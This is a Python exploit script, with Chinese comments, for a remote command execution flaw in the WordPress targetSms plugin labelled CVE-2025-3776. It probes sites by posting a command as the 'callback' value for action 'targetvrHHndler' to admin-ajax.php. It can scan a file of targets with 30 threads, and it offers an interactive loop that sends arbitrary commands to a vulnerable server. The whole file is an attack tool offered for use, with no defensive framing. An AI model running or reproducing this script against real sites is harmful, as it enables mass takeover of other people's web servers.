#WordPress targetSms 远程命令执行漏洞(CVE-2025-3776)
import textwrap
from multiprocessing.dummy import Pool
import requests, argparse

def main():
    banner = """
                ___  _ _     ________  _ _     _____
                \  \/// \ /\/  __/\  \/// \ /\/  __/
                 \  / | | |||  \   \  / | | |||  \  
                 / /  | \_/||  /_  / /  | \_/||  /_ 
                /_/   \____/\____\/_/   \____/\____\                                
                    """
    print(banner)
    parser = argparse.ArgumentParser(
        description="脚本检测",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("示例：python yueyue_rce.py -u http://127.0.0.1")
    )
    parser.add_argument("-u", dest="url", type=str, help="URL")
    parser.add_argument("-f", dest="file", type=str, help="FILE")
    parser.add_argument("-c", dest="exec",action="store_true", help="COMMAND")
    args = parser.parse_args()
    urls = []
    if args.exec and args.url:
        url=args.url
        if 'http://' not in args.url:
            url=f"http://{args.url}"
        if check(url):
            while(1):
                com=input(">")
                exp(url,com)
    elif args.url:
        if 'http://' in args.url:
            check(args.url)
        else:
            url=(f"http://{args.url}")
            check(url)
    elif args.file:
        try:
         with open(args.file, 'r+', encoding='utf-8') as f:
            for domain in f:
                domain = domain.strip()
                if 'http://' in domain:
                    urls.append(domain)
                else:
                    urls.append(f"http://{domain}")
        except FileNotFoundError as e:
            print(e)
        pool = Pool(30)
        pool.map(check, urls)

def exp(domain,command):
    headers = {'Accept-Encoding': 'gzip, deflate',
               'Accept': 'application/json, text/plain, */*',
               'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0',
               'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'}
    data = {f'action=targetvrHHndler&callback={command}'}
    full_url = f"{domain}/wp-admin/admin-ajax.php"
    try:
        response = requests.post(full_url, headers=headers, data=data, verify=False, timeout=5)
        if response.status_code == 200 and 'function set_cookie()' in response.text:
            print(response.text)
        else:
            print("执行失败！")
    except Exception as e:
        pass

def check(domain,command='phpinfo'):
    headers = {'Accept-Encoding': 'gzip, deflate',
                'Accept': 'application/json, text/plain, */*',
                'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0',
                'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'}
    data={f'action=targetvrHHndler&callback={command}'}
    full_url = f"{domain}/wp-admin/admin-ajax.php"
    try:
        response = requests.post(full_url, headers=headers,data=data,verify=False,timeout=5)
        if response.status_code == 200 and 'function set_cookie()' in response.text:
            print(f"[+]存在漏洞:{full_url}")
            return True
        else:
            print(f"[-]不存在漏洞:{full_url}")
            return False
    except Exception as e:
        pass

if __name__ == '__main__':
    main()